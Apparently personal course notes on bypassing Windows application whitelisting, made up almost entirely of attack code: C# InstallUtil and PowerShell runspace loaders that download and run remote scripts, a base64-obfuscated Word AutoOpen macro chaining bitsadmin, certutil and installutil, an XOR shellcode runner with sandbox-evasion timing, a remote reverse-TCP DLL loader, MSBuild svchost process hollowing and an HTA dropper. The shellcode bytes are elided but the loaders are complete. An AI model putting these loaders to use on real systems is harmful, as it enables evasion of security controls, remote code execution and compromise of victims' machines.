# Application Whitelisting

## Alternate Data Streams(ADS)
![[Pasted image 20210703193000.png]]
### Can use copy file resolve this problem
![[Pasted image 20210703194305.png]]
### Bypass Powershell language scope
```
// Add reference System.Management.Automation.dll
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace Runspaces
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://192.168.49.70/PowerUp.ps1') | IEX;Invoke-AllChecks | Out-File -FilePath C:\\Tools\\test2.txt";
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}

```
### Install Bypass AppLocker Code
```
// Add reference System.Management.Automation.dll
// Add reference System.Configuration.Install
using System;
using System.Configuration.Install;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            String cmd = "(New-Object System.Net.WebClient).DownloadString('http://xxxx.xxxx/PowerUp.ps1') | IEX;Invoke-AllChecks | Out-File -FilePath C:\\share\\test2.txt";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}
```
### Install Bypass Command
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U i.exe
```
### 8.3.3.1-2 Exercises Word Macro
```
certutil -encode Bypass.exe file.txt
certutil -decode file.txt Bypass.exe
```
```
bitsadmin /Transfer myJob http://192.168.49.70/file.txt
C:\Windows\Tasks\enc.txt && certutil -decode C:\Windows\Tasks\enc.txt
C:\Windows\Tasks\Bypass.exe && del C:\Windows\Tasks\enc.txt &&
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile=
/LogToConsole=false /U C:\Windows\Tasks\Bypass.exe
```
### VBA Macro 8.3.4.1 Exercise
```
Function DecodeBase64(b64$)
    Dim b
    With CreateObject("Microsoft.XMLDOM").createElement("b64")
        .DataType = "bin.base64": .Text = b64
        b = .nodeTypedValue
        With CreateObject("ADODB.Stream")
          .Open: .Type = 1: .Write b: .Position = 0: .Type = 2: .Charset = "utf-8"
          DecodeBase64 = .ReadText
          .Close
        End With
    End With
End Function

Sub MyMacro()
Dim strArg As String
'cmd /c "bitsadmin /Transfer myJob http://192.168.49.70/file.txt C:\Windows\Tasks\enc.txt && certutil -decode C:\Windows\Tasks\enc.txt C:\Windows\Tasks\Bypass.exe && del C:\Windows\Tasks\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\Bypass.exe"
Dim a As String
strArg = "Y21kIC9jICJiaXRzYWRtaW4gL1RyYW5zZmVyIG15Sm9iIGh0dHA6Ly8xOTIuMTY4LjQ5LjcwL2ZpbGUudHh0IEM6XFdpbmRvd3NcVGFza3NcZW5jLnR4dCAmJiBjZXJ0dXRpbCAtZGVjb2RlIEM6XFdpbmRvd3NcVGFza3NcZW5jLnR4dCBDOlxXaW5kb3dzXFRhc2tzXEJ5cGFzcy5leGUgJiYgZGVsIEM6XFdpbmRvd3NcVGFza3NcZW5jLnR4dCAmJiBDOlxXaW5kb3dzXE1pY3Jvc29mdC5ORVRcRnJhbWV3b3JrNjRcdjQuMC4zMDMxOVxpbnN0YWxsdXRpbC5leGUgL2xvZ2ZpbGU9IC9Mb2dUb0NvbnNvbGU9ZmFsc2UgL1UgQzpcV2luZG93c1xUYXNrc1xCeXBhc3MuZXhlIg=="
a = DecodeBase64(strArg)
GetObject("winmgmts:").Get("Win32_Process").Create a, Null, Null, pid
End Sub
Sub AutoOpen()
MyMacro
```
### 8.3.4.1_Exercise install shell
```
using System;
using System.Configuration.Install;
using System.Runtime.InteropServices;
namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            byte[] buf = new byte[606] {.....};

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] ^ 0xAA) & 0xFF);
            }

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```
### 8.4.5.1-2 Exercises 
```
// Add reference System.Management.Automation.dll
// Add reference System.Configuration.Install
using System;
using System.Configuration.Install;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }
    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            String cmd = "$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.70/Invoke-dll.dll');" +
                         " $ass = [System.Reflection.Assembly]::Load($data);" +
                         "$class = $ass.GetType('Invoke_dll.Reverse_tcp');" +
                         "$method = $class.GetMethod('runner');" +
                         "$method.Invoke(0,$null)";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}


```
### 8.4.5.2 Extra Mile - csproh with svchost process hollowing
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe shell.csproj
```
```
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes shellcode. -->
  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
  <!-- Save This File And Execute The Above Command -->
  <!-- Author: Casey Smith, Twitter: @subTee -->
  <!-- License: BSD 3-Clause -->
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>

      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassExample :  Task, ITask
        {
            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
            struct STARTUPINFO
            {
                public Int32 cb;
                public IntPtr lpReserved;
                public IntPtr lpDesktop;
                public IntPtr lpTitle;
                public Int32 dwX;
                public Int32 dwY;
                public Int32 dwXSize;
                public Int32 dwYSize;
                public Int32 dwXCountChars;
                public Int32 dwYCountChars;
                public Int32 dwFillAttribute;
                public Int32 dwFlags;
                public Int16 wShowWindow;
                public Int16 cbReserved2;
                public IntPtr lpReserved2;
                public IntPtr hStdInput;
                public IntPtr hStdOutput;
                public IntPtr hStdError;
            }

            [StructLayout(LayoutKind.Sequential)]
            internal struct PROCESS_INFORMATION
            {
                public IntPtr hProcess;
                public IntPtr hThread;
                public int dwProcessId;
                public int dwThreadId;
            }

            [StructLayout(LayoutKind.Sequential)]
            internal struct PROCESS_BASIC_INFORMATION
            {
                public IntPtr Reserved1;
                public IntPtr PebAddress;
                public IntPtr Reserved2;
                public IntPtr Reserved3;
                public IntPtr UniquePid;
                public IntPtr MoreReserved;
            }

            [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
            static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,[In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

            [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
            private static extern int ZwQueryInformationProcess(IntPtr hProcess,int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,uint ProcInfoLen, ref uint retlen);

            [DllImport("kernel32.dll", SetLastError = true)]
            static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,[Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

            [DllImport("kernel32.dll")]
            static extern bool WriteProcessMemory(IntPtr hProcess,IntPtr lpBaseAddress,byte[] lpBuffer,Int32 nSize,out IntPtr lpNumberOfBytesWritten);

            [DllImport("kernel32.dll", SetLastError = true)]
            private static extern uint ResumeThread(IntPtr hThread);

          public override bool Execute()
          {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero,IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

  			byte[] buf = new byte[606] {.....};

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] ^ 0xAA) & 0xFF);
            }

            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            ResumeThread(pi.hThread);

            Environment.Exit(0);
            return true;
          }
        }
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```
### 8.5.1.1 Sharpshooter not working in hta 
replace hta code
```
<html>
<head>
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("cmd.exe /c \"bitsadmin /Transfer myJob http://192.168.49.70/file.txt C:\\Windows\\Tasks\\enc.txt && certutil -decode C:\\Windows\\Tasks\\enc.txt C:\\Windows\\Tasks\\Bypass.exe && del C:\\Windows\\Tasks\\enc.txt && C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U C:\\Windows\\Tasks\\Bypass.exe && pause \"");
</script>
</head>
<body>
<script language="JScript">
self.close();
</script>
</body>
</html>
```
### xsl shellcode
```
<?xml version='1.0'?>
<stylesheet version="1.0"
xmlns="http://www.w3.org/1999/XSL/Transform"
xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[SHELLCODE HERE]]>
</ms:script>
</stylesheet>
```
